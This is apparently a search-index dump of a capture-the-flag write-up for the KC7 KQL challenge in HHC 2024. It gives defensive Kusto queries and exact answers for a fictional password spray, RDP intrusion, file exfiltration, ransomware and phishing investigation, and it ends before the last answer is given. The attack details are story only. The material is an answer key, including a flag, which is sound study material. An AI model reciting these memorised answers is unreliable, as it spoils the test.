summarize FailedAttempts = count() by username, src_ip, result | where FailedAttempts \u003e= 5 | sort by FailedAttempts desc What was the IP address associated with the password spray?\nSolution\nAuthenticationEvents | where result == \"Failed Login\" | summarize FailedAttempts = count() by username, src_ip, result | where FailedAttempts \u003e= 5 | sort by FailedAttempts desc | summarize count() by src_ip | limit 1 59.171.58.12\nQuestion 2 After launching the password spray attack, Team Wombley potentially had success and logged into several accounts, gaining access to sensitive systems.\nEve Snowshoes weighs in: “This is where things start to get dangerous. The number of compromised accounts will show us just how far they’ve infiltrated.”\nHow many unique accounts were impacted where there was a successful login from 59.171.58.12?\nSolution\nAuthenticationEvents | where src_ip == \"59.171.58.12\" | where description !has \"failed\" | distinct username | summarize count() 23\nQuestion 3 In order to login to the compromised accounts, Team Wombley leveraged a service that was accessible externally to gain control over Alabaster’s devices.\nEve Snowshoes remarks, “Identifying the service that was open externally is critical. It shows us how the attackers were able to bypass defenses and access the network. This is a common weak point in many systems.”\nWhat service was used to access these accounts/devices?\nSolution\nThe answer was found by inspecting the output from the query:\nUser successfully logged onto Elf-Lap-A-Snowflakebreeze via RDP. Question 4 Once Team Wombley gained access to Alabaster’s system, they targeted sensitive files for exfiltration. Eve Snowshoes emphasizes, “When critical files are exfiltrated, it can lead to devastating consequences. Knowing exactly what was taken will allow us to assess the damage and prepare a response.”\nThe ProcessEvents table will help you track activities that occurred on Alabaster’s laptop. By narrowing down the events by timestamp and hostname, you’ll be able to pinpoint the file that was exfiltrated.\nWhat file was exfiltrated from Alabaster’s laptop?\nSolution\nlet HOSTNAME = toscalar(Employees | where name has \"Alabaster\" | project hostname ); let TIMEWINDOW = toscalar(AuthenticationEvents | where src_ip == \"59.171.58.12\" | where description !has \"failed\" | order by timestamp asc | limit 1 | project timestamp ); ProcessEvents | where timestamp \u003e= TIMEWINDOW+10m | where hostname == HOSTNAME | extend filename = tostring(split(process_commandline, \"\\\\\")[-1]) | summarize count() by filename | order by count_ desc Secret_Files.zip\nQuestion 5 After exfiltrating critical files from Alabaster’s system, Team Wombley deployed a malicious payload to encrypt the device, leaving Alabaster locked out and in disarray.\nEve Snowshoes comments, “The final blow in this attack was the ransomware they unleashed. Finding the name of the malicious file will help us figure out how they crippled the system.”\nWhat is the name of the malicious file that was run on Alabaster’s laptop?\nSolution (same as previous solution due to statistics made):\nlet HOSTNAME = toscalar(Employees | where name has \"Alabaster\" | project hostname ); let TIMEWINDOW = toscalar(AuthenticationEvents | where src_ip == \"59.171.58.12\" | where description !has \"failed\" | order by timestamp asc | limit 1 | project timestamp ); ProcessEvents | where timestamp \u003e= TIMEWINDOW+10m | where hostname == HOSTNAME | extend filename = tostring(split(process_commandline, \"\\\\\")[-1]) | summarize count() by filename | order by count_ desc EncryptEverything.exe\nQuestion 6 Outstanding work! You’ve successfully pieced together the full scope of Team Wombley’s attack. Your investigative skills are truly impressive, and you’ve uncovered every critical detail.\nJust to recap: Team Wombley launched a cyber assault on Alabaster, beginning with a password spray attack that allowed them to gain access to several accounts. Using an external service over RDP, they infiltrated Alabaster’s system, exfiltrating sensitive files including the blueprints for snowball cannons and drones. To further their attack, Wombley executed a malicious file, which encrypted Alabaster’s entire system leaving them locked out and in chaos.\nTo obtain your flag use the KQL below with your last answer!\nlet flag = \"Change This!\"; let base64_encoded = base64_encode_tostring(flag); print base64_encoded Solution\nlet flag = \"EncryptEverything.exe\"; let base64_encoded = base64_encode_tostring(flag); print base64_encoded RW5jcnlwdEV2ZXJ5dGhpbmcuZXhl\nSection 4: Echoes in the Frost: Tracking the Unknown Threat Question 1 As you close out the investigation into Team Wombley’s attack, Eve Snowshoes meets you with a serious expression. “You’ve done an incredible job so far, but now we face our most elusive adversary yet. This isn’t just another team—it’s an unknown, highly skilled threat actor who has been operating in the shadows, leaving behind only whispers of their presence. We’ve seen traces of their activity, but they’ve covered their tracks well.”\nShe pauses, the weight of the challenge ahead clear. “This is where things get even more difficult. We’re entering uncharted territory—prepare yourself for the toughest investigation yet. Follow the clues, stay sharp, and let’s uncover the truth behind these Echoes in the Frost.”\nType stay frosty to begin\nQuestion 2 Noel Boetie, the IT administrator, reported receiving strange emails about a breach from colleagues. These emails might hold the first clue in uncovering the unknown threat actor’s methods. Your task is to identify when the first of these suspicious emails was received.\nEve Snowshoes remarks, “The timing of these phishing emails is critical. If we can identify the first one, we’ll have a better chance of tracing the threat actor’s initial moves.”\nWhat was the timestamp of first phishing email about the breached credentials received by Noel Boetie?\nSolution\nEmail | where subject contains \"breach\" | order by timestamp asc 2024-12-12T14:48:55Z Question 3 Noel Boetie followed the instructions in the phishing email, downloading and running the file, but reported that nothing seemed to happen afterward. However, this might have been the key moment when the unknown threat actor infiltrated the system.\nWhen did Noel Boetie click the link to the first file?\nSolution\nlet FIRST_TIMESTAMP = toscalar(Email | where subject contains \"breach\" | order by timestamp asc ); let BOETIE_IP = toscalar(Employees | where username contains \"boetie\" | project ip_addr ); OutboundNetworkEvents | where timestamp \u003e= FIRST_TIMESTAMP | where src_ip == BOETIE_IP | order by timestamp asc | limit 1 2024-12-12T15:13:55Z Question 4 The phishing email directed Noel Boetie to download a file from an external domain.\nEve Snowshoes, “The domain and IP they used to host the malicious file is a key piece of evidence. It might lead us to other parts of their operation, so let’s find it.”\nWhat was the IP for the domain where the file was hosted?\nSolution\nlet FIRST_TIMESTAMP = toscalar(Email | where subject contains \"breach\" | order by timestamp asc ); let BOETIE_IP = toscalar(Employees | where username contains \"boetie\" | project ip_addr ); let MALWARE_IP = OutboundNetworkEvents | where timestamp \u003e= FIRST_TIMESTAMP | where src_ip == BOETIE_IP | order by timestamp asc | limit 1 | extend domain = tostring(split(url, \"/\")[2]) | join PassiveDns on $left.domain == $right.domain | distinct ip ; MALWARE_IP 182.56.23.122 Question 5 Let’s back up for a moment. Now that we’re thinking this through, how did the unknown threat actor gain the credentials to execute this attack? We know that three users have been sending phishing emails, and we’ve identified the domain they used.\nIt’s time to dig deeper into the AuthenticationEvents and see if anything else unusual happened that might explain how these accounts were compromised.\nEve Snowshoes suggests, “We need to explore the AuthenticationEvents for these users. Attackers often use compromised accounts to blend in and send phishing emails internally. This might reveal how they gained access to the credentials.”\nLet’s take a closer look at the authentication events. I wonder if any connection events from 182.56.23.122. If so what hostname was accessed?\nSolution\nlet FIRST_TIMESTAMP = toscalar(Email | where subject contains \"breach\" | order by timestamp asc ); let BOETIE_IP = toscalar(Employees | where username contains \"boetie\" | project ip_addr ); let MALWARE_IP = toscalar(OutboundNetworkEvents | where timestamp \u003e= FIRST_TIMESTAMP | where src_ip == BOETIE_IP | order by timestamp asc | limit 1 | extend domain = tostring(split(url, \"/\")[2]) | join PassiveDns on $left.domain == $right.domain | distinct ip ); AuthenticationEvents | where src_ip == MALWARE_IP | project hostname WebApp-ElvesWorkshop Question 6 It appears someone accessed the WebApp-ElvesWorkshop from the IP address 182.56.23.122. This could be a key moment in the attack. We need to investigate what was run on the app server and, more importantly, if the threat actor dumped any credentials from it.\nEve Snowshoes, “Accessing the web app from an external IP is a major red flag. If they managed to dump credentials from the app server, that could explain how they gained access to other parts of the system.”\nWhat was the script that was run to obtain credentials?\nSolution",
    "description": "Welcome to your mission to solve the The Great Elf Conflict! To do so, you’ll need to harness the power of KQL (Kusto Query Language) to navigate through the data and uncover crucial evidence.\nYour next step is to meet with Eve Snowshoes, Cyber Engineer, at the at the North Pole Cyber Defense Unit. Eve is known for unmatched expertise in KQL and has been eagerly awaiting your arrival. Alt text",
    "tags": [],
    "title": "Microsoft Kc7",
    "uri": "/act2/microsoft-kc7/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "This is a new chapter.",
    "description": "This is a new chapter.",
    "tags": [],
    "title": "About",
    "uri": "/about/index.html"
  },
  {
    "breadcrumb": "",
    "content": "",
    "description": "",
    "tags": [],
    "title": "HHC 2024",
    "uri": "/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Categories",
    "uri": "/categories/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tags",
    "uri": "/tags/index.html"
  }
]
